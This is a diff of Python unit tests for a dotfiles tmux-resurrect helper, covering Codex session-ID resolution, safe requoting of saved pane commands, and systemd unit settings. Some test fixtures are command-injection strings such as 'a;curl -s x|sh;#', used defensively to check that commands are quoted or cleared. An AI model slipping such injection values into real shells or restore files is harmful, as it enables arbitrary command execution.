@@ -115,6 +115,61 @@ class IdentityTests(unittest.TestCase):
              mock.patch.object(MODULE, "claude_metadata_id", return_value=None):
             self.assertEqual(MODULE.ai_resume_command(10), [])
 
+    def codex_command(self, argv, locks, roots):
+        with mock.patch.object(
+            MODULE, "process_tree", return_value=[(20, 2, argv)]
+        ), mock.patch.object(
+            MODULE, "open_codex_ids", return_value=(locks, [])
+        ) as open_ids, mock.patch.object(
+            MODULE, "session_metadata",
+            side_effect=lambda value, _: (
+                {"id": value, "thread_source": "user"} if value in roots
+                else None
+            ),
+        ):
+            command = MODULE.ai_resume_command(10)
+        self.assertEqual(open_ids.call_count, 1)
+        return command
+
+    def test_codex_live_thread_wins_over_stale_resume_argv(self):
+        # REQ-2: /new or /resume inside the TUI leaves argv at the old ID.
+        self.assertEqual(
+            self.codex_command(["codex", "resume", ID_A], [ID_B], {ID_B}),
+            ["codex", "resume", ID_B],
+        )
+        self.assertEqual(
+            self.codex_command(["codex", "resume", ID_A], [ID_A], {ID_A}),
+            ["codex", "resume", ID_A],
+        )
+
+    def test_codex_argv_id_needs_uncontradicted_evidence(self):
+        # No live evidence at all: the explicit argv ID stands.
+        self.assertEqual(
+            self.codex_command(["codex", "resume", ID_A], [], set()),
+            ["codex", "resume", ID_A],
+        )
+        # Only the same ID, unverified: still agrees.
+        self.assertEqual(
+            self.codex_command(["codex", "resume", ID_A], [ID_A], set()),
+            ["codex", "resume", ID_A],
+        )
+        # A different unverified live ID, or two roots: unresolved.
+        self.assertEqual(
+            self.codex_command(["codex", "resume", ID_A], [ID_B], set()), []
+        )
+        self.assertEqual(
+            self.codex_command(["codex", "resume", ID_A], [ID_A, ID_B], {ID_A, ID_B}),
+            [],
+        )
+
+    def test_codex_hooks_flag_follows_the_process_to_the_live_thread(self):
+        self.assertEqual(
+            self.codex_command(
+                ["codex", "resume", ID_A, "--disable", "hooks"], [ID_B], {ID_B}
+            ),
+            ["codex", "resume", ID_B, "--disable", "hooks"],
+        )
+
     def test_codex_open_ids_require_one_metadata_verified_root(self):
         processes = [(20, 2, ["codex"])]
         with mock.patch.object(MODULE, "process_tree", return_value=processes), \
@@ -137,11 +192,64 @@ class RewriteTests(unittest.TestCase):
     def setUp(self):
         self.panes = {("work", "2", "5"): 123}
 
+    def enrich(self, line, children):
+        return MODULE.enrich_state(
+            [line], self.panes, lambda _: None, lambda _: children
+        )[0]
+
     def test_ordinary_command_is_byte_for_byte_intact(self):
         line = pane_line("ssh", ":ssh host -- unusual")
         self.assertEqual(
-            MODULE.enrich_state([line], self.panes, lambda _: None), [line]
+            self.enrich(line, [["ssh", "host", "--", "unusual"]]), line
         )
+        shell = pane_line("zsh", ":")
+        self.assertEqual(self.enrich(shell, []), shell)
+
+    def test_ordinary_command_is_requoted_from_live_argv(self):
+        # SEC-3: resurrect's ps strategy joins argv with spaces, and a restore
+        # types the text into the pane's shell.
+        line = pane_line("tail", ":tail -f a;curl -s x|sh;#")
+        rewritten = self.enrich(line, [["tail", "-f", "a;curl -s x|sh;#"]])
+        self.assertTrue(rewritten.endswith("\t:tail -f 'a;curl -s x|sh;#'\n"))
+        self.assertEqual(
+            MODULE.shlex.split(rewritten.rstrip("\n").split("\t")[10][1:]),
+            ["tail", "-f", "a;curl -s x|sh;#"],
+        )
+
+    def test_unproven_ordinary_command_is_cleared(self):
+        line = pane_line("vim", ":vim a;touch X")
+        # No live child with that exact command line (e.g. already exited).
+        self.assertTrue(self.enrich(line, []).endswith("\t:\n"))
+        self.assertTrue(
+            self.enrich(line, [["vim", "b"]]).endswith("\t:\n")
+        )
+        # Two different children that print the same text: ambiguous.
+        self.assertTrue(self.enrich(
+            line, [["vim", "a;touch", "X"], ["vim", "a;touch X"]]
+        ).endswith("\t:\n"))
+        # Arguments that cannot be typed back safely.
+        for bad in ("a\u0007b", "a\u001bb", "a\ufffdb"):
+            with self.subTest(bad=bad):
+                self.assertTrue(self.enrich(
+                    pane_line("vim", f":vim {bad}"), [["vim", bad]]
+                ).endswith("\t:\n"))
+
+    def test_child_commands_reads_direct_children_only(self):
+        import os
+        import subprocess
+        child = subprocess.Popen(
+            [sys.executable, "-c", "import time; time.sleep(30)", "x;y"]
+        )
+        try:
+            commands = MODULE.child_commands(os.getpid())
+            self.assertIn(
+                [sys.executable, "-c", "import time; time.sleep(30)", "x;y"],
+                commands,
+            )
+            self.assertEqual(MODULE.child_commands(child.pid), [])
+        finally:
+            child.kill()
+            child.wait()
 
     def test_resolved_and_unresolved_ai_are_rewritten(self):
         resolved = MODULE.enrich_state(
@@ -160,6 +268,7 @@ class RewriteTests(unittest.TestCase):
             [pane_line("zsh", ":zsh -lc '/opt/ai/bin/claude --last'")],
             self.panes,
             lambda _: None,
+            lambda _: [["zsh", "-lc", "'/opt/ai/bin/claude", "--last'"]],
         )[0]
         self.assertTrue(hidden.endswith("\t:\n"))
 
@@ -202,7 +311,8 @@ class RewriteTests(unittest.TestCase):
                 "os.environ", {"TMUX_RESURRECT_HOOK_OK": str(marker)}
             ), mock.patch.object(
                 MODULE, "live_panes", return_value=self.panes
-            ), mock.patch.object(MODULE, "ai_resume_command", return_value=None):
+            ), mock.patch.object(MODULE, "ai_resume_command", return_value=None), \
+                 mock.patch.object(MODULE, "child_commands", return_value=[]):
                 MODULE.run(state)
             self.assertEqual(marker.read_text(), "snapshot\n")
             self.assertFalse(Path(str(state) + ".ai-ok").exists())
@@ -211,6 +321,7 @@ class RewriteTests(unittest.TestCase):
 
 SOURCE_USER_PATH = re.compile(r"/home/[A-Za-z0-9_.-]+|/Users/[A-Za-z0-9_.-]+")
 RESTORE_FILES = (
+    "tmux/tmux.conf",
     "tmux/resurrect.conf",
     "tmux/resurrect-save",
     "tmux/resurrect-ai-session.py",
@@ -219,6 +330,14 @@ RESTORE_FILES = (
     "systemd/user/tmux-resurrect-autosave.timer",
     "manifests/tmux-plugins.json",
     "docs/tmux-auto-restore.ko.md",
+)
+
+
+# PLAT-1: the installer's tools directory (fd shim, fzf-preview.sh) first, as
+# zsh/zshenv orders it, then the user and system bin directories.
+UNIT_PATH = (
+    "PATH=%h/.local/share/personal-dotfiles/bin:%h/.local/bin:"
+    "/usr/local/bin:/usr/bin:/bin"
 )
 
 
@@ -239,6 +358,8 @@ class PortableFilesTests(unittest.TestCase):
                 text = (REPO_ROOT / name).read_text(encoding="utf-8")
                 self.assertIsNone(SOURCE_USER_PATH.search(text))
                 self.assertNotIn("DISPLAY=:0", text)
+                # Generic reasons only; nothing about one machine's private setup.
+                self.assertNotRegex(text.lower(), r"sidebar|workspace restore app")
 
     def test_scripts_are_executable(self):
         for name in ("tmux/resurrect-save", "tmux/resurrect-ai-session.py"):
@@ -247,10 +368,21 @@ class PortableFilesTests(unittest.TestCase):
 
     def test_login_unit_is_static_and_graphical(self):
         values = unit_values(REPO_ROOT / "systemd/user/tmux.service")
-        self.assertEqual(values["After"], ["graphical-session-pre.target"])
+        # PLAT-2/REQ-3: after the desktop has exported WAYLAND_DISPLAY/DISPLAY
+        # (graphical-session.target), not merely after graphical-session-pre.
+        after = " ".join(values["After"]).split()
+        self.assertIn("graphical-session.target", after)
         self.assertEqual(values["WantedBy"], ["graphical-session.target"])
-        self.assertEqual(
-            values["Environment"], ["PATH=%h/.local/bin:/usr/local/bin:/usr/bin:/bin"]
+        # Logging out of the desktop does not stop the server.
+        self.assertNotIn("PartOf", values)
+        self.assertNotIn("BindsTo", values)
+        self.assertEqual(values["Environment"], [UNIT_PATH])
+        tools = json.loads(
+            (REPO_ROOT / "manifests/tools.json").read_text(encoding="utf-8")
+        )
+        self.assertIn(
+            tools["bin_dir"].replace("{data_home}", "%h/.local/share"),
+            UNIT_PATH.split("=", 1)[1].split(":"),
         )
         self.assertEqual(values["UnsetEnvironment"], ["TMUX TMUX_PANE"])
         self.assertIn("! tmux has-session", values["ExecCondition"][0])
@@ -268,6 +400,16 @@ class PortableFilesTests(unittest.TestCase):
         timer = unit_values(REPO_ROOT / "systemd/user/tmux-resurrect-autosave.timer")
         self.assertEqual(service["ExecStart"], ["%h/.dotfiles/tmux/resurrect-save"])
         self.assertEqual(service["ExecCondition"], ["/usr/bin/env tmux has-session"])
+        self.assertEqual(service["Environment"], [UNIT_PATH])
+        # resurrect-save's "not restored yet" skip is not a unit failure.
+        self.assertEqual(service["SuccessExitStatus"], ["75"])
+        skip = re.search(
+            r"^SKIPPED=(\d+)$",
+            (REPO_ROOT / "tmux/resurrect-save").read_text(encoding="utf-8"),
+            re.MULTILINE,
+        )
+        self.assertIsNotNone(skip)
+        self.assertEqual(skip.group(1), "75")
         self.assertEqual(timer["OnUnitActiveSec"], ["1min"])
         self.assertEqual(timer["Unit"], ["tmux-resurrect-autosave.service"])
         self.assertEqual(timer["WantedBy"], ["timers.target"])
